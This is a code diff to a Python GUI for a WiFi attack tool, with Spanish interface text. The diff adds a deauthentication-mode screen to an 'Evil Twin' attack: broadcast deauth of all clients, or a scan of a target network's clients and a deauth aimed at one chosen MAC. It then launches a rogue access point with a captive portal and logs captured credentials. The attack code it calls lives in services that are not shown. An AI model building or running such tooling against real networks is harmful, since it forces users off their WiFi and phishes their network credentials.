@@ -246,7 +246,7 @@ class WiFiView(BaseView):
         ctk.CTkLabel(self.main_frame, text="2. Selecciona tarjeta para Desautenticación:").pack(pady=5)
         deauth_ifaces = [i for i in interfaces if i != interfaces[0]] or interfaces
         deauth_var = ctk.StringVar(value=deauth_ifaces[0])
-        ctk.CTkOptionMenu(self.main_frame, variable=deauth_var, values=interfaces, fg_color=COLOR_BOTON_ROJO).pack(pady=5)
+        ctk.CTkOptionMenu(self.main_frame, variable=deauth_var, values=deauth_ifaces, fg_color=COLOR_BOTON_ROJO).pack(pady=5)
 
         def proceed():
             self.wifi_state["ap_iface"] = ap_var.get()
@@ -310,10 +310,113 @@ class WiFiView(BaseView):
                 fg_color=COLOR_BOTON_ROJO,
                 hover_color=COLOR_BOTON_HOVER,
                 anchor="w",
-                command=lambda portal_name=p: self._flow_evil_twin_launch(portal_name)
+                command=lambda portal_name=p: self._flow_evil_twin_select_deauth_mode(red, portal_name)
             ).pack(fill="x", pady=3)
 
-    def _flow_evil_twin_launch(self, portal_name):
+    def _flow_evil_twin_select_deauth_mode(self, red, portal_name):
+        self.wifi_state["evil_scan_pending"] = False
+        self.clear_frame()
+        self.add_back_button(lambda: self._flow_evil_twin_select_portal(red))
+        ctk.CTkLabel(self.main_frame, text="MODO DE DESAUTENTICACIÓN", font=ctk.CTkFont(size=18, weight="bold")).pack(pady=10)
+
+        ctk.CTkButton(
+            self.main_frame,
+            text="Broadcast (desautenticar a todos los clientes)",
+            fg_color=COLOR_BOTON_PELIGRO,
+            hover_color=COLOR_BOTON_PELIGRO_HOVER,
+            height=40,
+            command=lambda: self._flow_evil_twin_launch(portal_name, "broadcast")
+        ).pack(fill="x", padx=40, pady=6)
+
+        ctk.CTkButton(
+            self.main_frame,
+            text="Cliente específico (escanear y elegir MAC)",
+            fg_color=COLOR_BOTON_ROJO,
+            hover_color=COLOR_BOTON_HOVER,
+            height=40,
+            command=lambda: self._flow_evil_twin_scan_clients(red, portal_name)
+        ).pack(fill="x", padx=40, pady=6)
+
+        self.show_console()
+
+    def _flow_evil_twin_scan_clients(self, red, portal_name):
+        self.wifi_state["evil_scan_pending"] = True
+        self.clear_frame()
+        self.add_back_button(lambda: self._flow_evil_twin_cancel_client_scan(red, portal_name))
+        ctk.CTkLabel(self.main_frame, text=f"ESCANEANDO CLIENTES\n{red['essid']}", font=ctk.CTkFont(size=18, weight="bold")).pack(pady=10)
+        self.show_console()
+        self.write_console(f"[*] Rastreando clientes asociados a {red['bssid']} (10s)...")
+
+        def worker():
+            mon = self.wifi_state.get("mon_deauth")
+            if not mon:
+                deauth_iface = self.wifi_state.get("deauth_iface")
+                if deauth_iface:
+                    mon = self.services.wifi.enable_monitor_mode(deauth_iface)
+                    self.wifi_state["mon_deauth"] = mon
+            if not mon:
+                self.run_on_ui(lambda: self._flow_evil_twin_show_clients(
+                    red, portal_name, [], error="No hay interfaz en modo monitor."))
+                return
+            clientes = self.services.wifi.scan_clients(mon, red['bssid'], red['ch'], duration=10)
+            self.run_on_ui(lambda: self._flow_evil_twin_show_clients(red, portal_name, clientes))
+
+        threading.Thread(target=worker, daemon=True).start()
+
+    def _flow_evil_twin_cancel_client_scan(self, red, portal_name):
+        self.wifi_state["evil_scan_pending"] = False
+        self._flow_evil_twin_select_deauth_mode(red, portal_name)
+
+    def _flow_evil_twin_show_clients(self, red, portal_name, clientes, error=None):
+        if not self.wifi_state.get("evil_scan_pending"):
+            # El operador abandonó la pantalla de escaneo: descartar resultados tardíos.
+            return
+        self.wifi_state["evil_scan_pending"] = False
+
+        self.clear_frame()
+        self.add_back_button(lambda: self._flow_evil_twin_select_deauth_mode(red, portal_name))
+        ctk.CTkLabel(self.main_frame, text="SELECCIONA CLIENTE OBJETIVO", font=ctk.CTkFont(size=18, weight="bold")).pack(pady=10)
+
+        frame = ctk.CTkScrollableFrame(self.main_frame, height=300)
+        frame.pack(fill="both", expand=True, padx=20, pady=10)
+
+        ctk.CTkButton(
+            frame,
+            text="Todos (Broadcast - desautenticar a todos)",
+            fg_color=COLOR_BOTON_PELIGRO,
+            hover_color=COLOR_BOTON_PELIGRO_HOVER,
+            command=lambda: self._flow_evil_twin_launch(portal_name, "broadcast")
+        ).pack(fill="x", pady=5)
+
+        if clientes:
+            for mac in clientes:
+                ctk.CTkButton(
+                    frame,
+                    text=f"Cliente: {mac}",
+                    fg_color=COLOR_BOTON_ROJO,
+                    hover_color=COLOR_BOTON_HOVER,
+                    command=lambda m=mac: self._flow_evil_twin_launch(portal_name, "directed", m)
+                ).pack(fill="x", pady=3)
+        else:
+            ctk.CTkButton(
+                frame,
+                text="Reintentar escaneo (10s)",
+                fg_color=COLOR_BOTON_ROJO,
+                hover_color=COLOR_BOTON_HOVER,
+                command=lambda: self._flow_evil_twin_scan_clients(red, portal_name)
+            ).pack(fill="x", pady=5)
+
+        self.show_console()
+
+        if error:
+            self.write_console(f"[!] {error} Use Broadcast o reintente el escaneo.")
+        elif clientes:
+            self.write_console(f"[+] Clientes detectados: {len(clientes)}. Seleccione la MAC objetivo.")
+        else:
+            self.write_console("[!] No se detectaron clientes. Puede reintentar el escaneo o usar Broadcast.")
+
+    def _flow_evil_twin_launch(self, portal_name, deauth_mode="broadcast", cliente_mac=None):
+        self.wifi_state["evil_scan_pending"] = False
         self.clear_frame()
         ctk.CTkLabel(self.main_frame, text="EVIL TWIN EN EJECUCIÓN", font=ctk.CTkFont(size=20, weight="bold"),
                      text_color=COLOR_BOTON_PELIGRO).pack(pady=10)
@@ -337,12 +440,18 @@ class WiFiView(BaseView):
         def on_cred(cred_line):
             self.write_console(f"[!] *** CREDENCIAL CAPTURADA ***: {cred_line}")
 
+        if deauth_mode == "directed" and cliente_mac:
+            self.write_console(f"[*] Deauth dirigido al cliente: {cliente_mac}")
+        else:
+            self.write_console("[*] Deauth en modo broadcast (todos los clientes).")
+
         self.services.evil_twin.start_evil_twin(
             ap_iface=ap_iface,
             mon_deauth=mon_deauth,
             red_target=red_target,
             portal_name=portal_name,
-            deauth_mode="broadcast",
+            deauth_mode=deauth_mode,
+            cliente_mac=cliente_mac,
             on_output=self.write_console,
             on_cred=on_cred
         )
